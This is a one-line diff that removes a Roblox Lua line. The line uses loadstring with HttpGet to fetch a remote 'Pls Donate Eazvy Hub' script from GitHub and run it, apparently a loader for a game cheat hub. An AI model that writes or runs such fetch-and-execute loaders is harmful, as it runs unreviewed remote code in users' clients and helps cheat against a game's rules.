@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Eazvy/public-scripts/main/Pls%20Donate%20Eazvy%20Hub.lua"))()
